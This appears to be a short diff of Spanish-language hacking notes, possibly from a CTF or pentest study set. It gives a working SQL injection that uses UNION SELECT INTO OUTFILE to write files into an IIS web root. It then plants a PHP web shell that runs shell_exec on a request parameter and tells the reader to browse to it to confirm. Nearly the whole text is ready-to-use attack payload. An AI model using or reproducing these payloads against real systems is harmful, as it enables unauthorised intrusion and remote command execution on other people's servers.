@@ -1,0 +1,9 @@
+' union select 1,2,"test",4,5,6 into outfile "C:\\inetpub\\wwwroot\\uploads\\test.txt"-- -
+
+LA PAGINA WEB SI TIENE UPLOAD PUES VAMOS A ESE FOLDER Y CON ESTO SUBIMOS EL ARCHIVO Y DESPUES EN LA WEB VAMOS AL FOLDER DE UPLOADS Y BUSCAMOS test.txt
+
+{Creamos shell en web}
+
+' union select 1,2,"<?php echo \"<pre>\" . shell_exec($_REQUEST['cmd']). \"</pre>\"; ?>",4,5,6 into outfile "C:\\inetpub\\wwwroot\\uploads\\shelldock.php"-- - {C:\\inetepub\wwwroot -> Son raizes predeterminadas que se usa en IIS 10}
+
+[Y para comprobarlo metete en /uploads/shelldock.php]
